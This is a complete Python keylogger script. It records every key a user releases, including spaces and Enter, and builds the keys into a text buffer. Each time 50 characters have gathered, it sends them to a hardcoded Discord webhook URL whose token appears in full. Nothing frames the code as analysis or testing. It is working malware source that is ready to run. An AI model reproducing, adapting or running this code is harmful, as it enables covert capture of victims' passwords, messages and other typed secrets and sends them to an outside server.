import keyboard
import requests
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1381773220822253659/mLHrGBtImsls5NbNkZH1Tg0rnhbrtKUhpac3wTEfW7jFFTtbZ0VQXH3TZ9gHptTibE_f"
log = ""

def send_to_discord(message):
    data = {
        "content": message
    }
    requests.post(WEBHOOK_URL, json=data)

def log_keystroke(event):
    global log
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        else:
            key = f"[{key}]"
    log += key

    # Send log if it reaches 50 characters
    if len(log) >= 50:
        send_to_discord(log)
        log = ""

keyboard.on_release(log_keystroke)

# Keep the script running
keyboard.wait()